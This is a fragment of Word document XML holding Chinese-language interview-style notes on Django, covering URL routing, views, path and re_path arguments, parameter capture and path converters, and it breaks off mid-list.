    <w:p w14:paraId="74B3C81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django那种在app中定义的task则需要使用@shared_task</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="350B2388" w14:textId="4690A0FA" w:rsidR="00113B11" w:rsidRPr="00CF0D9D" w:rsidRDefault="00113B11"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hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>49</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00843D31" w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>常用的</w:t>
      </w:r>
      <w:r w:rsidR="00843D31" w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>web</w:t>
      </w:r>
      <w:r w:rsidR="00843D31" w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>后台开发框架</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="550641CB" w14:textId="41D46A9E" w:rsidR="00843D31" w:rsidRDefault="00843D31" w:rsidP="00843D31">
      <w:r>
        <w:t>答：django</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B824625" w14:textId="24F54C9D" w:rsidR="00113B11" w:rsidRDefault="00113B11" w:rsidP="00CF0D9D">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="300" w:lineRule="exact"/>
        <w:contextualSpacing/>
      </w:pPr>
      <w:r w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>150</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00843D31" w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:r w:rsidR="00843D31" w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>是怎么找到</w:t>
      </w:r>
      <w:r w:rsidR="00843D31" w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>views</w:t>
      </w:r>
      <w:r w:rsidR="00843D31" w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
      <w:r w:rsidR="00843D31" w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidR="00843D31">
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C16F192" w14:textId="696C5192" w:rsidR="00843D31" w:rsidRDefault="00843D31" w:rsidP="00843D31">
      <w:r>
        <w:t>答：讲了一下生命周期，然后讲了as_view 和dispatch</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="473E4C4C" w14:textId="77777777" w:rsidR="00843D31" w:rsidRPr="00377E3F" w:rsidRDefault="00843D31" w:rsidP="00843D31">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="C7CBBD"/>
        <w:spacing w:before="150" w:after="150" w:line="300" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="宋体" w:hAnsi="Arial" w:cs="Arial"/>
          <w:bCs/>
          <w:color w:val="494949"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="宋体" w:hAnsi="Arial" w:cs="Arial"/>
          <w:bCs/>
          <w:color w:val="494949"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>初始</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="宋体" w:hAnsi="Arial" w:cs="Arial"/>
          <w:bCs/>
          <w:color w:val="494949"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Django url+views</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C01ECEE"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是啥？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30EB40D3"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全球统一资源定位符</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C22BABD"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视图</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="宋体" w:hAnsi="Arial" w:cs="Arial"/>
          <w:bCs/>
          <w:color w:val="494949"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>(views)</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="宋体" w:hAnsi="Arial" w:cs="Arial"/>
          <w:bCs/>
          <w:color w:val="494949"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>是什么</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="宋体" w:hAnsi="Arial" w:cs="Arial"/>
          <w:bCs/>
          <w:color w:val="494949"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B62C790"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视图中存放处理逻辑函数等</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="478ED686"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的基本格式？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DC8AC38"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w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="宋体" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>协议</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="宋体" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>+</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="宋体" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>域名</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="宋体" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>(ip)+</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="宋体" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>端口</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="宋体" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>+</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="宋体" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>路径</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="宋体" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>+</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="宋体" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>参数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2683BC82"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在</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="宋体" w:hAnsi="Arial" w:cs="Arial"/>
          <w:bCs/>
          <w:color w:val="494949"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>django</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="宋体" w:hAnsi="Arial" w:cs="Arial"/>
          <w:bCs/>
          <w:color w:val="494949"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中如何起作用？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26E38ABD" w14:textId="77777777" w:rsidR="00843D31" w:rsidRPr="00377E3F" w:rsidRDefault="00843D31" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="53"/>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 xml:space="preserve">　　</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="宋体" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>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模式，在第一个匹配的模式停止，一旦匹配，</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导入并调用给定的视图，如果中间出错或没有匹配到，返回</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="宋体" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>404</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="024E4164" w14:textId="77777777" w:rsidR="00843D31" w:rsidRPr="00377E3F" w:rsidRDefault="00843D31" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="53"/>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urlpatterns</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="宋体" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>变量是一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="宋体" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>(django.urls.path,diango.url.re_path)</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="宋体" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>列表</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F2F4CCF" w14:textId="77777777" w:rsidR="00843D31" w:rsidRPr="00377E3F" w:rsidRDefault="00843D31" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="53"/>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实际使用过程中为了方便管理项目，一个请求首先来到项目目录下的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模式，按规则匹配后会指向相应的应用</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="宋体" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>urls</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="宋体" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，再去调用指定应用的视图（</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="宋体" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>views</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="宋体" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24A24C83" w14:textId="77777777" w:rsidR="00843D31" w:rsidRPr="00377E3F" w:rsidRDefault="00843D31" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="53"/>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搜索</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搜索的是什么，只搜索路径部分，</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="宋体" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="宋体" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的参数和域名不会去搜索</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="015E07A0" w14:textId="77777777" w:rsidR="00843D31" w:rsidRPr="00377E3F" w:rsidRDefault="00843D31" w:rsidP="0049386C">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="53"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="C7CBBD"/>
        <w:spacing w:before="150" w:beforeAutospacing="0" w:after="150" w:afterAutospacing="0" w:line="300" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b w:val="0"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b w:val="0"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>规则</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F5723ED"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Fonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>urls</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中的</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>path</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>re_path</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D09E151"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-path(route,view,kWARGS=NONE,name=none)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F159178"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正则</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rStyle w:val="md-plain"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:bCs/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>-re_path(route,view,kWARGS=NONE,name=none)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="197A6ACC"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p>
    <w:p w14:paraId="085FC6CD"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是个视图</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D5A6885"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lastRenderedPageBreak/>
        <w:t>kwargs:</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rStyle w:val="md-plain"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>额外参数，传递给</w:t>
      </w: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必须是一个字典</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7068A7CB"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name:url</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rStyle w:val="md-plain"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的命名</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通过</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rStyle w:val="md-plain"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>reverse</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rStyle w:val="md-plain"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>实现不管</w:t>
      </w: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怎么变都指向同一个视图</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79FA076F" w14:textId="77777777" w:rsidR="00843D31" w:rsidRPr="00377E3F" w:rsidRDefault="00843D31" w:rsidP="0049386C">
      <w:pPr>
        <w:pStyle w:val="md-end-block"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="53"/>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drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5464C81C" wp14:editId="395DC29F">
            <wp:extent cx="8076565" cy="5095875"/>
            <wp:effectExtent l="0" t="0" r="63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086566" cy="5102185"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="07FC34B9"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搜索的是什么，只搜索路径部分，</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的参数和域名不会去搜索，那么参数如何传递？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="717F595F"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在</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中捕获参数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D948C3F"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规则中使用</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rStyle w:val="md-plain"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>‘&lt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rStyle w:val="md-plain"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>变量名</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rStyle w:val="md-plain"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>&gt;’</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rStyle w:val="md-plain"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>可以捕获</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中的值，传递给视图，注意捕获的值是字符串</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06D514BF"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时想要用一条</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>来代替同种类型的</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>url eg: 127.0.0.1/teacher/52 127.0.0.1/teacher/53...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37899E48"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路径转换器</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="358A0128"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常用的路径转换器：</w:t>
      </w:r>
      <w:r w:rsidRPr="00377E3F">
        <w:rPr>
          <w:rStyle w:val="md-plain"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="494949"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>url </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A5B1C93"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lastRenderedPageBreak/>
        <w:t>-str</w:t>
